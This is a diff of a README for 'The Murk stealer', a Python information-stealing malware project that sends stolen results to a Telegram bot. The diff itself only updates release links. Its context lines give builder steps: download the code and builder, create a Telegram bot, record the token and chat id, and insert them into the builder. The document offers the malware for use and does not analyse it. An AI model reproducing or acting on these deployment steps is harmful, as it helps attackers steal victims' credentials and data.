@@ -9,7 +9,7 @@
 
 
 Stealer written on Python, results will be sent to Telegram bot.
-[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v5.0.0)
+[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v5.0.1)
 
 ***
 ### ⛔Disclaimer⛔
@@ -184,7 +184,7 @@ __All in all, this code is not hard, maybe in the next few updates I'll add comm
 ---
 ### 🔨Builder
 
-__So firstly you need to download [python](https://www.python.org/downloads/). Secondly you have to download all files from [github](#up).Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v5.0.0) and place in in one folder with previous files. 
+__So firstly you need to download [python](https://www.python.org/downloads/). Secondly you have to download all files from [github](#up).Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v5.0.1) and place in in one folder with previous files. 
 Finaly go to the "https://t.me/BotFather" and create your own bot. You need to save token and bot name.
 Now you need to get your chat id. To do this, go to the next bot "https://t.me/TgramUserIDBot" and save the id.
 Insert this data in builder__
